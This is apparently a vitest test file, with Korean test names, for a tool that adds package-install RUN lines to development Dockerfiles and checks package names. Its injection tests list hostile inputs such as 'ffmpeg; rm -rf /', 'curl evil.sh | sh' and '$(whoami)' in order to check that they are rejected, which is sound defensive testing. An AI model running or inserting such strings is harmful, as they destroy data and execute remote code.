import { describe, expect, it } from 'vitest';
import { applySystemPackages, detectPackageFamily, SystemPackageError } from './system-packages';
import { ManagedServiceSchema } from './schema';

const NODE_DOCKERFILE = ['# b-studio가 만든 개발용 이미지', 'FROM node:22-bookworm-slim', '', 'WORKDIR /workspace', '', 'EXPOSE 3000', 'CMD ["sh", "-c", "pnpm install && exec pnpm dev"]', ''].join('\n');

const SPRING_DOCKERFILE = ['# b-studio가 만든 개발용 이미지', 'FROM eclipse-temurin:21-jdk', '', 'WORKDIR /workspace', 'ENV GRADLE_USER_HOME=/gradle-home', '', 'EXPOSE 8080', 'CMD ["./gradlew", "bootRun", "--no-daemon", "--console=plain"]', ''].join('\n');

describe('detectPackageFamily', () => {
  it('Debian·Ubuntu 계열로 보는 이미지는 apt다', () => {
    expect(detectPackageFamily('node:22-bookworm-slim')).toBe('apt');
    expect(detectPackageFamily('eclipse-temurin:21-jdk')).toBe('apt');
    expect(detectPackageFamily('python:3.12-slim')).toBe('apt');
    expect(detectPackageFamily('gradle:jdk21')).toBe('apt');
    expect(detectPackageFamily('maven:3-eclipse-temurin-21')).toBe('apt');
  });

  it('alpine이 이름에 들어간 이미지는 apk다(Debian 계열 이름이 섞여 있어도 alpine을 우선한다)', () => {
    expect(detectPackageFamily('eclipse-temurin:21-jdk-alpine')).toBe('apk');
    expect(detectPackageFamily('node:22-alpine')).toBe('apk');
  });

  it('모르는 이미지는 undefined다(조용히 한쪽으로 단정하지 않는다)', () => {
    expect(detectPackageFamily('rust:1-slim')).toBeUndefined();
    expect(detectPackageFamily('scratch')).toBeUndefined();
  });
});

describe('applySystemPackages', () => {
  it('apt 계열 이미지에 FROM 바로 뒤로 설치 RUN을 끼워 넣는다', () => {
    const result = applySystemPackages(NODE_DOCKERFILE, ['ffmpeg']);
    const lines = result.split('\n');
    expect(lines[1]).toBe('FROM node:22-bookworm-slim');
    expect(result).toContain('RUN apt-get update && apt-get install -y --no-install-recommends ffmpeg && rm -rf /var/lib/apt/lists/*');
    // FROM과 기존 WORKDIR 사이에 들어가야 한다(이미지 레이어 캐시가 잘 되도록 앞쪽에 둔다)
    expect(result.indexOf('apt-get install')).toBeLessThan(result.indexOf('WORKDIR'));
  });

  it('여러 패키지를 한 RUN에 모은다', () => {
    const result = applySystemPackages(SPRING_DOCKERFILE, ['ffmpeg', 'imagemagick']);
    expect(result).toContain('apt-get install -y --no-install-recommends ffmpeg imagemagick');
  });

  it('빈 목록이면 원본을 그대로 돌려준다', () => {
    expect(applySystemPackages(NODE_DOCKERFILE, [])).toBe(NODE_DOCKERFILE);
  });

  it('멱등적이다: 같은 선언으로 다시 불러도 블록이 두 번 쌓이지 않는다', () => {
    const once = applySystemPackages(NODE_DOCKERFILE, ['ffmpeg']);
    const twice = applySystemPackages(once, ['ffmpeg']);
    expect(twice).toBe(once);
    expect(twice.match(/RUN apt-get update/g)).toHaveLength(1);
  });

  it('선언을 바꾸면 블록 내용도 바뀐다(이전 블록을 지우고 다시 넣는다)', () => {
    const withFfmpeg = applySystemPackages(NODE_DOCKERFILE, ['ffmpeg']);
    const withImagemagick = applySystemPackages(withFfmpeg, ['imagemagick']);
    expect(withImagemagick).not.toContain('ffmpeg');
    expect(withImagemagick).toContain('imagemagick');
    expect(withImagemagick.match(/RUN apt-get update/g)).toHaveLength(1);
  });

  it('선언을 지우면(빈 배열) 블록도 사라져 원본과 같아진다', () => {
    const withFfmpeg = applySystemPackages(NODE_DOCKERFILE, ['ffmpeg']);
    const removed = applySystemPackages(withFfmpeg, []);
    expect(removed).toBe(NODE_DOCKERFILE);
  });

  it('alpine 이미지는 apk add로 설치한다', () => {
    const dockerfile = 'FROM node:22-alpine\nWORKDIR /workspace\n';
    const result = applySystemPackages(dockerfile, ['ffmpeg']);
    expect(result).toContain('RUN apk add --no-cache ffmpeg');
  });

  it('모르는 베이스 이미지 계열은 조용히 넘어가지 않고 오류를 던진다', () => {
    const dockerfile = 'FROM rust:1-slim\nWORKDIR /workspace\n';
    expect(() => applySystemPackages(dockerfile, ['ffmpeg'])).toThrow(SystemPackageError);
    expect(() => applySystemPackages(dockerfile, ['ffmpeg'])).toThrow(/패키지 계열/);
  });

  it('FROM 줄이 없는 Dockerfile은 오류를 던진다', () => {
    expect(() => applySystemPackages('WORKDIR /workspace\n', ['ffmpeg'])).toThrow(SystemPackageError);
  });

  it('셸 메타문자가 든 이름은 거부한다(셸 주입 방지, 방어적 재검증)', () => {
    for (const malicious of ['ffmpeg; rm -rf /', 'ffmpeg && curl evil.sh | sh', '$(whoami)', 'ffmpeg`id`', 'foo bar', '../etc']) {
      expect(() => applySystemPackages(NODE_DOCKERFILE, [malicious])).toThrow(SystemPackageError);
    }
  });
});

describe('ManagedServiceSchema의 systemPackages 검증', () => {
  const base = { source: 'managed' as const, template: 'fastapi', path: '.', port: 8000, preview: 'openapi' as const };

  it('올바른 패키지 이름은 받는다', () => {
    const result = ManagedServiceSchema.safeParse({ ...base, systemPackages: ['ffmpeg', 'libpq-dev', 'postgresql-client-16'] });
    expect(result.success).toBe(true);
  });

  it('셸 메타문자·공백이 든 이름은 거부한다', () => {
    for (const malicious of ['ffmpeg; rm -rf /', 'ffmpeg && echo hi', 'a b', 'a/b', '$(id)', '']) {
      const result = ManagedServiceSchema.safeParse({ ...base, systemPackages: [malicious] });
      expect(result.success).toBe(false);
    }
  });

  it('대문자로 시작하는 이름은 거부한다(관례상 소문자만 쓴다)', () => {
    const result = ManagedServiceSchema.safeParse({ ...base, systemPackages: ['Ffmpeg'] });
    expect(result.success).toBe(false);
  });

  it('생략하면 undefined다(기존 studio.yaml과 호환)', () => {
    const result = ManagedServiceSchema.parse(base);
    expect(result.systemPackages).toBeUndefined();
  });

  it('너무 많은 패키지는 거부한다(상한 20개)', () => {
    const result = ManagedServiceSchema.safeParse({ ...base, systemPackages: Array.from({ length: 21 }, (_, index) => `pkg${index}`) });
    expect(result.success).toBe(false);
  });
});
